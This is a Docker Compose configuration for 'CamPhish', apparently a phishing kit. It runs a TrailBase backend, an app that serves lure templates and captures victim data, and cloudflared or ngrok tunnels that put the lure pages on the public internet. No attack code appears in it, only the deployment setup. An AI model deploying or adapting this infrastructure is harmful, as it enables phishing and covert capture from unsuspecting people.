services:
  # =========================================================================
  # TrailBase — Data layer (REST CRUD, Realtime, Auth, Admin UI)
  # =========================================================================
  trailbase:
    image: trailbase/trailbase:latest
    container_name: camphish-trailbase
    restart: unless-stopped
    ports:
      - "127.0.0.1:4000:4000"
    environment:
      - ADDRESS=0.0.0.0:4000
      - ADMIN_EMAIL=${TRAILBASE_ADMIN_EMAIL:-admin@camphish.local}
      - ADMIN_PASSWORD=${TRAILBASE_ADMIN_PASSWORD:-changeme}
    volumes:
      - trailbase_data:/app/traildepot
      - ./trailbase/schema:/schema:ro
    entrypoint: ["/bin/sh", "-c", "mkdir -p /app/traildepot/migrations && cp /schema/*.sql /app/traildepot/migrations/ 2>/dev/null; exec /app/trail run"]
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost:4000/_/admin/"]
      interval: 10s
      timeout: 5s
      retries: 10
      start_period: 20s
    networks:
      - camphish-net

  # =========================================================================
  # CamPhish — Application server (template serving + capture + dashboard)
  # =========================================================================
  app:
    build: .
    image: camphish:${VERSION:-2.1.0}
    container_name: camphish-app
    restart: unless-stopped
    ports:
      - "127.0.0.1:8080:8080"
    volumes:
      - camphish_data:/app/data
      - ./templates:/app/templates:ro
    environment:
      - DATA_DIR=/app/data
      - TEMPLATES_DIR=/app/templates
      - FRONTEND_DIR=/app/frontend/dist
      - LISTEN_ADDR=0.0.0.0:8080
      - TUNNEL_LINK=
      - RUST_LOG=${LOG_LEVEL:-info}
      - GRACEFUL_SHUTDOWN=true
      - ENABLE_COMPRESSION=true
      - ENABLE_TEMPLATE_CACHE=true
      - TRAILBASE_URL=http://trailbase:4000
      - TRAILBASE_API_KEY=${TRAILBASE_API_KEY:-}
    depends_on:
      trailbase:
        condition: service_started
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/api/health"]
      interval: ${HEALTH_CHECK_INTERVAL:-30}s
      timeout: 5s
      retries: ${HEALTH_CHECK_RETRIES:-3}
      start_period: ${HEALTH_CHECK_START_PERIOD:-10}s
    deploy:
      resources:
        limits:
          memory: 512M
        reservations:
          memory: 64M
    networks:
      - camphish-net

  # =========================================================================
  # Tunnels
  # =========================================================================
  cloudflared:
    image: cloudflare/cloudflared:latest
    container_name: camphish-cloudflared
    restart: unless-stopped
    profiles: [cloudflared]
    command: ["tunnel", "--url", "http://app:8080", "--no-autoupdate"]
    depends_on:
      app:
        condition: service_healthy
    networks:
      - camphish-net

  ngrok:
    image: ngrok/ngrok:latest
    container_name: camphish-ngrok
    restart: unless-stopped
    profiles: [ngrok]
    command: ["http", "app:8080", "--log=stdout"]
    environment:
      - NGROK_AUTHTOKEN=${NGROK_AUTHTOKEN:-}
    depends_on:
      app:
        condition: service_healthy
    networks:
      - camphish-net

volumes:
  camphish_data:
  trailbase_data:

networks:
  camphish-net:
    driver: bridge
